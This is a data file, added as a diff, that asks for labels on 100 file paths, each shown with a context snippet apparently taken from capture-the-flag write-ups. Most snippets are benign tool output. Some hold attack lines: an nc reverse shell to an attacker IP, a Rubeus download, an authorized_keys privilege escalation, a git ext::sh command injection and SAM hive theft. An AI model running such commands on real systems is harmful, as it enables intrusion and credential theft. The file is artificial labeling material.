@@ -1,0 +1,203 @@
+Label these 100 paths (chunk 9/15).
+Reply with one jsonl code block, one record per path, in input order.
+
+1. C:\Users\C.Neri\desktop
+   context: *Evil-WinRM* PS C:\Users\C.Neri\desktop> cat user.txt 29f9de83************************
+2. C:\Users\Richard\source\repos\repos.txt
+   context: er_template, redirect, url_for import os  app = Flask(__name__)  # Configuration REPO_FILE_PATH = r'C:\Users\Richard\source\repos\repos.txt'  @app.route('/', methods=['GET', 'POST']) def index():     
+3. /root/TeamCity/buildAgent/lib/jackson-module-parameter-names.jar
+   context: :/root/TeamCity/buildAgent/lib/connections-api-common.jar:/root/TeamCity/buildAgent/lib/logging.jar:/root/TeamCity/buildAgent/lib/jackson-module-parameter-names.jar:/root/TeamCity/buildAgent/lib/commo
+4. /ten.vl/dist/img/cyber-security-cybersecurity-device-60504.jpg
+   context: ttp://ten.vl/dist/img/caffeine-coffee-cup-6347.jpg 200      GET       81l      464w    44565c http://ten.vl/dist/img/cyber-security-cybersecurity-device-60504.jpg 200      GET        7l      971w    7
+5. /home/oxdf/.gnupg
+   context: re free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law.  Home: /home/oxdf/.gnupg Supported algorithms: Pubkey: RSA, ELG, DSA, ECDH, ECDSA, EDDSA Cipher: IDEA, 3DES
+6. /opt/app/static/assets/images/exquisite-dining.jpg
+   context: t/app/static/assets/images/home.jpg JPEG 1024x1024 1024x1024+0+0 8-bit sRGB 232842B 0.000u 0:00.000 /opt/app/static/assets/images/exquisite-dining.jpg JPEG 1024x1024 1024x1024+0+0 8-bit sRGB 280854B 0
+7. /usr/local/bin/clamscan
+   context: bin\:/bin, mail_badpass  User sbrown may run the following commands on snoopy:     (root) NOPASSWD: /usr/local/bin/clamscan ^--debug /home/sbrown/scanfiles/[a-zA-Z0-9.]+$
+8. /www.response.htb/status/main.js.php
+   context: javascript"}   def get_digest(url):     cookies = {"PHPSESSID": url}     resp = requests.get("http://www.response.htb/status/main.js.php", cookies=cookies)     digest = re.findall("'session_digest':'(
+9. /var/log/grafana
+   context: PASSWORD=RioTecRANDEntANT! GF_SECURITY_ADMIN_USER=enzo GF_PATHS_DATA=/var/lib/grafana GF_PATHS_LOGS=/var/log/grafana PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin
+10. C:\Users\sqlmgmt\Documents
+   context: |_|   |__/  v1.6.0  [*] Connecting to 'S200401.overwatch.htb:5985' as 'sqlmgmt' evil-winrm-py PS C:\Users\sqlmgmt\Documents>
+11. C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter
+   context: ondition Path="C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System\*" /><FilePathCondition Path="C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter:*" /><FilePathCondition Path="C:\Windows\SysW
+12. /home/oxdf/hackthebox/response-10.10.11.163/Documents/authorized_keys
+   context: private argument is not set, the private key will not be displayed, even if recovered. Details for /home/oxdf/hackthebox/response-10.10.11.163/Documents/authorized_keys: n: 359077333510123807185930751
+13. C:\Users\svc_ldap\Documents
+   context: 3_cle4r!'  Evil-WinRM shell v3.4  Info: Establishing connection to remote endpoint  *Evil-WinRM* PS C:\Users\svc_ldap\Documents>
+14. /home/service/.ssh
+   context: e/.psql_history NFS         10.129.234.160  48491  10.129.234.160   1337       dr--   4.0KB         /home/service/.ssh
+15. /jupiter.htb/portfolio.html
+   context: ter.htb/img/about => http://jupiter.htb/img/about/ 200      GET      268l      628w    11913c http://jupiter.htb/portfolio.html 301      GET        7l       12w      178c http://jupiter.htb/img/icons 
+16. /var/www/clicker.htb
+   context: e clicker.htb     ServerAlias www.clicker.htb      ServerAdmin webmaster@localhost     DocumentRoot /var/www/clicker.htb     ErrorLog ${APACHE_LOG_DIR}/error.log     CustomLog ${APACHE_LOG_DIR}/access
+17. /usr/local/lib/libclamunrar_iface.so.11.0.0
+   context: ug: searching for unrar, user-searchpath: /usr/local/lib LibClamAV debug: unrar support loaded from /usr/local/lib/libclamunrar_iface.so.11.0.0 LibClamAV debug: Initialized 1.0.0 engine LibClamAV debu
+18. /home/consul
+   context: /share/grafana:/bin/false mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false consul:x:997:997::/home/consul:/bin/false
+19. c:\ProgramData
+   context: c:\ProgramData>powershell wget 10.10.14.6/Rubeus.exe -outfile rubeus.exe
+20. C:\Users\steph.cooper\appdata\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407
+   context: DqxkFzw7vbQSYX1LftJiaf2waSc *Evil-WinRM* PS C:\> [Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Users\steph.cooper\appdata\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-11
+21. /monitorsthree.htb/index.php
+   context: vices => http://monitorsthree.htb/images/services/ 200      GET      338l      982w    13560c http://monitorsthree.htb/index.php 301      GET        7l       12w      178c http://monitorsthree.htb/adm
+22. C:\pagefile.sys
+   context: Virtual Memory: Available: 1,835 MB Virtual Memory: In Use:    1,364 MB Page File Location(s):     C:\pagefile.sys Domain:                    darkzero.ext Logon Server:              N/A Hotfix(s):    
+23. /root/TeamCity/buildAgent/lib/jdom.jar
+   context: b/gson.jar:/root/TeamCity/buildAgent/lib/spring-jdbc.jar:/root/TeamCity/buildAgent/lib/httpcore.jar:/root/TeamCity/buildAgent/lib/jdom.jar:/root/TeamCity/buildAgent/lib/oauth-integration-agent.jar:/ro
+24. /srv/gitlab-runner/config
+   context: maki@barrier:/srv/gitlab-runner/config$ ls -la total 20 drwxr-xr-x 2 root root 4096 Jan 28 11:24 . drwxr-xr-x 3 root root 4096 Dec 15  202
+25. /itrc.ssg.htb/index.php
+   context: http://itrc.ssg.htb/index.php
+26. /usr/bin/gdb
+   context: developer@faculty:~$ find / -group debug 2>/dev/null /usr/bin/gdb
+27. C:\Windows\Tasks
+   context: securable objects Copyright (C) 2006-2022 Mark Russinovich Sysinternals - www.sysinternals.com  RW C:\Windows\Tasks RW C:\Windows\tracing RW C:\Windows\Registration\CRMLog  W C:\Windows\System32\Tasks
+28. /.local/share/uv/tools/netexec/lib/python3.12/site-packages/nxc
+   context: ~/.local/share/uv/tools/netexec/lib/python3.12/site-packages/nxc
+29. /var/www/rainycloud/app.py
+   context: "file": "/bin/bash",       "pattern": {         "type": "ELF"       }     },     {       "file": "/var/www/rainycloud/app.py",       "pattern": {         "type": "PYTHON"       }     },     {       "f
+30. C:\Users\N.Thompson\Desktop
+   context: evil-winrm-py PS C:\Users\N.Thompson\Desktop> cat user.txt ae96f625************************
+31. /root/TeamCity/buildAgent/lib/agent-openapi.jar
+   context: ot/TeamCity/buildAgent/lib/log4j-slf4j-impl.jar:/root/TeamCity/buildAgent/lib/agentInstaller-UI.jar:/root/TeamCity/buildAgent/lib/agent-openapi.jar:/root/TeamCity/buildAgent/lib/agent-launcher.jar:/ro
+32. /var/lib/docker/overlay2/l/Z4RNRWTZKMXNQJVSRJE4P2JYHH
+   context: f1/merged type overlay (rw,relatime,lower dir=/var/lib/docker/overlay2/l/4Z77R4WYM6X4BLW7GXAJOAA4SJ:/var/lib/docker/overlay2/l/Z4RNRWTZKMXNQJVSRJE4P2JYHH:/var/lib/docker/overlay2/l/ CXAW6LQU6QOKNSSNUR
+33. /pokatdex.pokatmon.htb/images/2.png
+   context: htb/images/1.png"},{"name":"SpiderEyes","abilities":["Spinner Web","Tail Flipper"],"picture":"http://pokatdex.pokatmon.htb/images/2.png"},{"name":"Gangtooth","abilities":["Crocodile Bite","Ghost Boo"]
+34. /tmp/.cache/krb5cc.5049
+   context: webster@webserver:~$ klist Ticket cache: FILE:/tmp/.cache/krb5cc.5049 Default principal: ray.duncan@WINDCORP.HTB  Valid starting       Expires              Service princ
+35. /giveback.htb/wp-content/themes/bizberg/style.css
+   context: :00:00.000Z  | Readme: http://giveback.htb/wp-content/themes/bizberg/readme.txt  | Style URL: http://giveback.htb/wp-content/themes/bizberg/style.css?ver=6.8.1  | Style Name: Bizberg  | Style URI: htt
+36. C:\Users\Bob.Wood\Documents
+   context: s-ng 4.16  Evil-WinRM shell v3.4  Info: Establishing connection to remote endpoint  *Evil-WinRM* PS C:\Users\Bob.Wood\Documents>
+37. c:\users\miscsvc\desktop\user.txt
+   context: [dc1.scrm.local]: PS C:\Users\miscsvc\Documents> type c:\users\miscsvc\desktop\user.txt 8d9496bc************************
+38. C:\Users\adam.scott\Documents
+   context: |_|   |__/  v1.5.0  [*] Connecting to 'eighteen.htb:5985' as 'adam.scott' evil-winrm-py PS C:\Users\adam.scott\Documents>
+39. /WEB-INF/jsp/configuration.jsp
+   context: Manager(request, response))       return;      RequestDispatcher rd = request.getRequestDispatcher("/WEB-INF/jsp/configuration.jsp");     rd.include((ServletRequest)request, (ServletResponse)response)
+40. /tmp/example-new-repo
+   context: Git = require('simple-git') const git2 = simpleGit() git2.clone('ext::sh -c touch% /tmp/pwn% >&2', '/tmp/example-new-repo', ["-c", "protocol.ext.allow=always"]);
+41. \\r\npowershell
+   context: vmt.exe\r\n.\\vmt.exe\r\ndel .\\vmt.exe\r\nmanage-bde -off c:\\\r\ndisable-bitlocker -mountpoint c:\\\r\npowershell iwr https://catalog.s.download.windowsupdate.com/c/msdownload/update/software/secu/2
+42. C:\ProgramData\Microsoft\VisualStudio\SetupWMI
+   context: crosoft Windows [Versin 10.0.19045.4651] (c) Microsoft Corporation. Todos los derechos reservados.  C:\ProgramData\Microsoft\VisualStudio\SetupWMI> whoami nt authority\system
+43. /lms.permx.htb/README.md
+   context: http://lms.permx.htb/README.md
+44. C:\Users\rainbow\Desktop
+   context: C:\Users\rainbow\Desktop>type user.txt 81a0c03b************************
+45. C:/Windows/Tasks/Uploads/
+   context: 0);      // Your PHP code for handling form submission and file upload goes here.     $uploadDir = 'C:/Windows/Tasks/Uploads/'; // Base upload directory      if ($_SERVER["REQUEST_METHOD"] == "POST" &
+46. /etc/cron.hourly
+   context: # *  *  *  *  * user-name command to be executed 17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly 25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /
+47. C:\Users\C.Neri\appdata\local\Microsoft\Credentials
+   context: *Evil-WinRM* PS C:\Users\C.Neri\appdata\local\Microsoft\Credentials> cmdkey /l  Currently stored credentials:  * NONE *
+48. C:\Users\Administrator.UNIVERSITY\Documents
+   context: nt [proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.99.2:5985  ...  OK *Evil-WinRM* PS C:\Users\Administrator.UNIVERSITY\Documents>
+49. /var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_076
+   context: file or directory (2) [2415:2418:0309/174909.488589:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_076": No such file or director
+50. \\.\pipe\63b4fa37-0871-4f42-9ded-5ff0ff61fc8d\pipe\epmapper
+   context: Start PipeServer                                                                [*] CreateNamedPipe \\.\pipe\63b4fa37-0871-4f42-9ded-5ff0ff61fc8d\pipe\epmapper     [*] Trigger RPCSS                   
+51. C:\programdata\SAM.save
+   context: RM* PS C:\programdata> download SAM.save                                          Info: Downloading C:\programdata\SAM.save to SAM.save                                          Info: Download successf
+52. /localhost/assets/js/jquery.dropotron.min.js
+   context: 0309/174909.775754:VERBOSE1:network_delegate.cc(37)] NetworkDelegate::NotifyBeforeURLRequest: http://localhost/assets/js/jquery.dropotron.min.js [2415:2420:0309/174909.775920:VERBOSE1:network_delegate
+53. /permx.htb/404.html
+   context: 7l     1362w    20542c http://permx.htb/about.html 200      GET      208l      701w    10428c http://permx.htb/404.html [####################] - 2m    150000/150000  0s      found:12      errors:0    
+54. /.local/share/caddy/instance.uuid
+   context: y/locks/storage_clean.lock    156047      4 -rw-r--r--   1 hish     hish           36 Jan 12 10:23 ./.local/share/caddy/instance.uuid    155848      4 -rw-r--r--   1 hish     hish            2 Jan 12 
+55. /home/reader/.google_authenticator
+   context: /home/reader/.google_authenticator
+56. C:\Users\management_svc\desktop
+   context: *Evil-WinRM* PS C:\Users\management_svc\desktop> type user.txt 5b5f382a************************
+57. C:\Windows\system32\sc.exe
+   context: che                        SYSTEM Scheduled Start                                   SYSTEM          C:\Windows\system32\sc.exe start wuauserv CacheTask
+58. C:\Users\gale.dekarios\AppData\Roaming\mRemoteNG
+   context: PS C:\Users\gale.dekarios\AppData\Roaming\mRemoteNG> cat .\confCons.xml <?xml version="1.0" encoding="utf-8"?> <mrng:Connections xmlns:mrng="http://mre
+59. /public_html/test.inc
+   context: phps Uploading test.php to /public_html/test.phps sftp> put test.php test.inc Uploading test.php to /public_html/test.inc
+60. /includes/img.php
+   context: /includes/img.php
+61. /home/kai_relay/app/files
+   context: /home/kai_relay/app/files/*
+62. C:\Users\0xdf\Desktop\Encrypter.exe
+   context: re=neutral, PublicKeyToken=null // MVID: 8B183569-F3A3-401C-AF7F-F5C8FD67AA36 // Assembly location: C:\Users\0xdf\Desktop\Encrypter.exe  using System; using System.IO; using System.Security.Cryptograp
+63. /run/supervisord.pid
+   context: [supervisord] user=root nodaemon=true logfile=/dev/null logfile_maxbytes=0 pidfile=/run/supervisord.pid  [program:flask] command=python /app/run.py stdout_logfile=/dev/stdout stdout_logfile_maxbytes=0
+64. C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+   context: reateProcessWithLogonW() [+] Using Station\Desktop: Service-0x0-221a4f1$\Default [+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 896 created in background.
+65. /src/main/java/com/panda_search/htb/panda_search/MainController.java
+   context: rchApplicationTests.java ./src/main/java/com/panda_search/htb/panda_search/RequestInterceptor.java ./src/main/java/com/panda_search/htb/panda_search/MainController.java ./src/main/java/com/panda_searc
+66. /usr/local/bin/redis_connector_dev
+   context: dan_smith@shared:~$ find / -group sysadmin 2>/dev/null | grep -v '^/(sys|proc)' /usr/local/bin/redis_connector_dev
+67. /home/oxdf/.local/lib/python3.11/site-packages/pyoo.py
+   context: ev/shm/0xdf.xlsx') Traceback (most recent call last):   File "<stdin>", line 1, in <module>   File "/home/oxdf/.local/lib/python3.11/site-packages/pyoo.py", line 1889, in open_spreadsheet     document
+68. /home/john/automation/healthcheck.sh
+   context: ation.py john        1209  0.0  0.0   2892   972 ?        Ss   Sep08   0:00 /bin/sh -c sleep 140 && /home/john/automation/healthcheck.sh root        1212  0.0  0.0  55228  1712 ?        Ss   Sep08   0
+69. C:\Windows\System32\Microsoft\Crypto\DSS\MachineKeys\
+   context: ndition Path="C:   \Windows\System32\Microsoft\Crypto\DSS\MachineKeys:*" /><FilePathCondition Path="C:\Windows\System32\Microsoft\Crypto\DSS\MachineKeys\*" /><FilePathCondition Path="C:\Windows\System
+70. C:\Users\blake\Documents\app\instance
+   context: PS C:\Users\blake\Documents\app\instance> ls      Directory: C:\Users\blake\Documents\app\instance  Mode                 LastWriteTime
+71. /api.haxtables.htb/utils.php
+   context: 0w        0c http://api.haxtables.htb/index.php 200      GET        0l        0w        0c http://api.haxtables.htb/utils.php 301      GET        9l       28w      319c http://api.haxtables.htb/v2 => 
+72. /home/tyrell/.ssh/authorized_keys
+   context: n:~$ ETCDCTL_API=3 etcdctl put /customers/ten-1291b4cb/url 'privesc.ten.vl ‍        CustomLog "|$cp /home/tyrell/.ssh/authorized_keys /root/.ssh/authorized_keys" common  ‍        #' OK
+73. C:\Users\sqlmgmt\Desktop
+   context: evil-winrm-py PS C:\Users\sqlmgmt\Desktop> cat user.txt 956ab1b5************************
+74. /srv/ftp
+   context: /run/rpcbind:/usr/sbin/nologin proftpd:x:107:65534::/run/proftpd:/usr/sbin/nologin ftp:x:108:65534::/srv/ftp:/usr/sbin/nologin sshd:x:109:65534::/run/sshd:/usr/sbin/nologin statd:x:110:65534::/var/lib
+75. /var/spool/postfix
+   context: n/systemd:/usr/sbin/nologin messagebus:x:103:110::/nonexistent:/usr/sbin/nologin postfix:x:104:111::/var/spool/postfix:/usr/sbin/nologin _chrony:x:105:114:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/no
+76. \\.\pipe\db5ede65-43e3-48ba-9d45-dbdf1a9b0155\pipe\epmapper
+   context: 2589289184 [*] UseProtseqFunctionParamCount: 6 [*] HookRPC [*] Start PipeServer [*] CreateNamedPipe \\.\pipe\db5ede65-43e3-48ba-9d45-dbdf1a9b0155\pipe\epmapper [*] Trigger RPCSS [*] DCOM obj GUID: 000
+77. /var/lib/docker/overlay2/l/FDT56KIE
+   context: /docker/overlay2/l/6TLSBQSLTGP74QVFJVO2GOHLHL:/var/lib/docker/overlay2/l/OOXBDBKU7L25J3XQWTXLGRF5VQ:/var/lib/docker/overlay2/l/FDT56KIE TI2PMNR3HGWAZ3GIGS:/var/lib/docker/overlay2/l/JE6MIEIU6ONHIWNBG3
+78. C:\programdata\ps.exe
+   context: *Evil-WinRM* PS C:\programdata> .\sw.exe create /payload:"C:\programdata\ps.exe" /args:" -accepteula -s -d c:\programdata\nc64.exe -e cmd.exe 10.10.14.6 445" /title:"CVE-2022-3019
+79. /usr/local/nagiosxi/scripts/change_timezone.sh
+   context: ofile.sh     (root) NOPASSWD: /usr/local/nagiosxi/scripts/upgrade_to_latest.sh     (root) NOPASSWD: /usr/local/nagiosxi/scripts/change_timezone.sh     (root) NOPASSWD: /usr/local/nagiosxi/scripts/mana
+80. C:\ProgramData\LansweeperDecrypt.ps1
+   context: ypt.ps1: 100%|█████████████| 4.07k/4.07k [00:00<00:00, 10.0kB/s] [+] File uploaded successfully as: C:\ProgramData\LansweeperDecrypt.ps1 evil-winrm-py PS C:\ProgramData> powershell .\LansweeperDecrypt
+81. /var/www/pilgrimage.htb/shrunk
+   context: image.htb/magick convert /var/www/pilgrimage.htb/tmp/" . $upload->getName() . $mime . " -resize 50% /var/www/pilgrimage.htb/shrunk/" . $newname . $mime);       unlink($upload->getFullPath());
+82. C:\Users\Administrator\Documents\cleanup\cleanup.ps1
+   context: evil-winrm-py PS C:\> echo '' >> C:\Users\Administrator\Documents\cleanup\cleanup.ps1 evil-winrm-py PS C:\> echo '$cred = Get-StoredCredential' >> C:\Users\Administrator\Documents\clean
+83. /usr/local/lib/python3.8/dist-packages/impacket/smbconnection.py
+   context: on Path: /usr/local/lib/python3.8/dist-packages/impacket Traceback (most recent call last):   File "/usr/local/lib/python3.8/dist-packages/impacket/smbconnection.py", line 278, in login     return sel
+84. C:\Users\mark.adams
+   context: evil-winrm-py PS C:\Users\mark.adams> tree /f . Folder PATH listing Volume serial number is 0000025F 3985:943C C:\USERS\MARK.ADAMS +---D
+85. C:\Users\steph.cooper\appdata\Roaming\Microsoft\Credentials
+   context: *Evil-WinRM* PS C:\Users\steph.cooper\appdata\Roaming\Microsoft\Credentials> ls -force      Directory: C:\Users\steph.cooper\appdata\Roaming\Microsoft\Credentials  Mode
+86. /var/www/html/backdrop
+   context: /var/www/html/backdrop
+87. /school.flight.htb/aux.php
+   context: 30w      306c http://school.flight.htb/aux.html 403      GET        9l       30w      306c http://school.flight.htb/aux.php 200      GET       22l      238w     1689c http://school.flight.htb/ABOUT.ht
+88. /opt/app/static/assets/images/entertainment.jpg
+   context: tic/assets/images/luxury-cabins.jpg JPEG 1024x1024 1024x1024+0+0 8-bit sRGB 280817B 0.000u 0:00.004 /opt/app/static/assets/images/entertainment.jpg JPEG 1024x1024 1024x1024+0+0 8-bit sRGB 291864B 0.00
+89. /cat.htb/vote.php
+   context: p://cat.htb/contest.php => http://cat.htb/join.php 200      GET       41l       83w     1242c http://cat.htb/vote.php 301      GET        9l       28w      300c http://cat.htb/img => http://cat.htb/im
+90. /home/oxdf/agile/venv/lib/python3.11/site-packages/flask/app.py
+   context: RL+C to quit  * Restarting with stat  * Debugger is active! pub: ['oxdf', 'flask.app', 'wsgi_app', '/home/oxdf/agile/venv/lib/python3.11/site-packages/flask/app.py'] priv: ['32885290718598', b'060456d
+91. C:\Users\kioskUser0\Downloads
+   context: C:\Users\kioskUser0\Downloads>net user kioskuser0 User name                    kioskUser0 Full Name                    Kiosk Comm
+92. /usr/bin/VGAuthService
+   context: --config /etc/laurel/config.toml root         604  0.0  0.2  51160 11852 ?        Ss   12:20   0:00 /usr/bin/VGAuthService root         606  0.1  0.2 316084 10268 ?        Ssl  12:20   0:58 /usr/bin/v
+93. \\DC02.darkzero.ext\C$
+   context: SQL (darkzero\john.w  guest@master)> xp_dirtree \\DC02.darkzero.ext\C$ subdirectory   depth   file    ------------   -----   ----
+94. C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\C2FE12102303
+   context: 3D3B2F2A RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\C10CDDE211FE RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\C2FE12102303 RW C:\Windows\S
+95. /var/www/site
+   context: /var/www/site
+96. /var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_016
+   context: file or directory (2) [2415:2418:0309/174909.482967:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_016": No such file or director
+97. C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+   context: SQL (SIGNED\mssqlsvc  dbo@master)> SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt', SINGLE_CLOB) AS Contents; Bul
+98. /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
+   context: -get-device /usr/lib/xorg/Xorg.wrap /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd /usr/lib/x86_64-linux-gnu/enlig
+99. /register/index.php
+   context: /register/index.php
+100. /var/lib/docker/overlay2/l/FGHBJKAFBSAPJNSTCR6PFSQ7ER
+   context: docker/overlay2/l/QHFZCDCLZ4G4OM2FLV6Y2O6WC6:/var/lib/docker/overlay2/l/K5DOR3JD WEJL62G4CATP62ONTO:/var/lib/docker/overlay2/l/FGHBJKAFBSAPJNSTCR6PFSQ7ER:/var/lib/docker/overlay2/l/PDO4KALS2ULFY6MGW73
